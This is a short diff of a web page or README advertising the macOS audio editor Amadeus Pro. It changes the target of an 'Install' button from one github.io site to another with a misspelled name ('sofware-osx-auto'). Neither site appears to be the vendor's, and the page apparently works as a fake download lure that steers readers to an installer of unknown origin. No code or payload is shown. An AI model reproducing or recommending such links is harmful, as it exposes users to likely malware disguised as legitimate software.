@@ -6,7 +6,7 @@
 <h3>Amadeus Pro - professional audio editing</h3>
 <p>Amadeus Pro is a professional multi-track audio editor and recorder application specifically developed for macOS environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://mac-apps-install.github.io/.github/)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sofware-osx-auto.github.io/.github/Ap)
 </div>
 <br/><br>
 
